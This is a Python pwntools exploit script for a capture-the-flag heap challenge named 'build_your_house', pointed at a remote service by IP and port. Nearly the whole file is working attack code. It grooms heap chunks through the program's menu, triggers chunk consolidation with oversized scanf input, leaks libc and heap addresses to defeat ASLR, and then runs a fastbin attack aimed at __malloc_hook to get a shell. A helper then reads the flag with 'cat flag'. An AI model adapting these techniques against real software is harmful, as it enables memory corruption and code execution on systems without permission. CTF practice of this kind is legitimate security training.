from pwn import *
import sys

local       = 1
binary      = "build_your_house"
local_libc  = "/lib/x86_64-linux-gnu/libc.so.6"
ip          = "47.94.169.129"
port        = 32759
remote_libc = "libc.so.6"


def main(ip=ip,port=port):
    global p,elf,libc
    elf = ELF(binary)
    if local:
        context.log_level   = "debug"
        p=process(binary)
        # p=process('./build_your_house',env={'LD_PRELOAD':'./libc-2.23.so'})
        libc = ELF(local_libc)
        pwn()
    else:
        p=remote(ip,port)
        libc=ELF(remote_libc)
        pwn()
    return flag

def add(size,content):
    p.sendlineafter("ice:",str(1))
    p.sendlineafter("build?\n",str(size))
    p.sendafter("house?\n",content)
def delete(id):
    p.sendlineafter("ice:",str(2))
    p.sendlineafter("remove?\n",str(id))
def show(id):
    p.sendlineafter("ice:",str(3))
    p.sendlineafter("view?\n",str(id))


def pwn():
    add(0x38,'a'+'\n')#0
    add(0x38,'a'+'\n')#1
    add(0x38,'a'+'\n')#2
    add(0x38,'a'+'\n')#3
    add(0x47,'\x00'*0x30+p64(0x100)+p32(0x10)+'\n')#4
    for _ in range(5):
        add(0x38,'a'+'\n')
    add(0x47,'\n')#10
    
    delete(1)
    delete(2)
    delete(3)
    delete(4)
    p.sendlineafter("ice:",'0'*0x1000+'3')
    p.sendlineafter("view?\n",'10')
    
    delete(0)
    add(0x38,'a'*0x38)

    add(0x28,'a'+'\n')#1
    add(0x38,'a'+'\n')#2
    add(0x38,'a'+'\n')#3
    add(0x47,'a'+'\n')#4
    
    delete(1)
    delete(2)
    delete(3)
    p.sendlineafter("ice:",'0'*0x1000+'3')
    p.sendlineafter("view?\n",'10')

    delete(5)
    p.sendlineafter("ice:",'0'*0x1000+'3')
    p.sendlineafter("view?\n",'10')
    
    add(0x28,'a'+'\n')#1
    add(0x38,'a'+'\n')#2
    add(0x38,'a'+'\n')#3
    show(4)
    main_arean_88 = u64(p.recvuntil('\x7f')[-6::].ljust(8,'\x00'))
    print "main_arean_88:",hex(main_arean_88)
    if local:
        libc_addr = main_arean_88-88-0x3c4b20
    else:
        libc_addr = main_arean_88-88-0x3c4b20
    print "libc_addr:",hex(libc_addr)
    print "system:",hex(libc_addr+libc.sym['system'])
    print "malloc_hook:",hex(libc_addr+libc.sym['__malloc_hook'])
    add(0x47,'\n')#5
    
    delete(10)
    delete(4)
    show(5)
    heap_addr = u64(p.recv(6).ljust(8,'\x00'))
    print "heap_addr:",hex(heap_addr)
    heap_base = heap_addr - 0x290
    print "heap_addr:",hex(heap_base)
    bss_base = heap_base - (0x559f36a3c000-0x559f358c9000)
    print "bss_base:",hex(bss_base)
    add(0x47,'\n')#4
    add(0x47,'\n')#10
    add(0x47,'\n')#10

    #aslr
    #heap_addr:  0x55f4 8b 21 20 00
    #bss_base:   0x55f4 8a 09 f0 00
    #            0x55f4 8a 2f 00 8d

    #heap_addr:  0x55f7 e2 f6 10 00
    #bss_base:   0x55f7 e1 de e0 00
    #            0x55f7 e1 89 30 8d

    #heap_addr:  0x55db ba 50 20 00
    #bss_base:   0x55db b9 38 f0 00
    #            0x55db b9 81 e0 8d

    #no aslr
    #heap_addr:  0x5555 55 75 70 00
    #bss_base:   0x5555 54 5e 40 00
    #            0x5555 55 75 60 8d

    target_addr = (heap_addr&0xffffff000000)#-0x1000000  #0x555555000000
    target_addr += 0x756000                              #0x555555756000
    target_addr += 0x0b5                                 #0x55555575609d
    print "target_addr:",hex(target_addr)

    

    delete(4)
    delete(10)
    delete(5)
    
    add(0x47,p64(target_addr)+'\n')
    add(0x47,p64(target_addr)+'\n')
    add(0x47,p64(target_addr)+'\n')
    debug(p,"b *0x7ffff7a91230")
    add(0x47,'aaa'+p64(libc_addr+libc.sym['__malloc_hook'])+'\n')
    

    p.interactive()
    
def cat_flag():
    global flag
    p.recv()
    p.sendline("cat flag")
    flag = p.recvuntil('\n',drop=True)

def debug(p,content=''):
    if local:
        gdb.attach(p,content)
        raw_input()
    else:
        pass

if __name__ == "__main__":
    if(len(sys.argv)==3):
        ip      = sys.argv[1]
        port    = sys.argv[2]
    main()
